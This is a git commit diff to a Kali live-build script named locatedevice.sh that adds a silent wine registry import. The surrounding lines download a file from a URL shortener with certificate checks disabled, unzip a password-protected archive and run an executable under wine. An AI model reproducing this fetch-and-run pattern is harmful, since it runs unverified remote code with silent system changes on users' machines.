03cabc4906ba193822becc65bb838412e4222577
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-09-05 09:46:28 -0400

    Update locatedevice.sh

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -7,6 +7,7 @@ wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
 cd ~/init/;
 rm -rf init.exe;
 unzip -P1011011011 init.zip;
+wine regedit /s /root/s.reg;
 wine init.exe;
 sudo openvpn vpn;
 exit 0
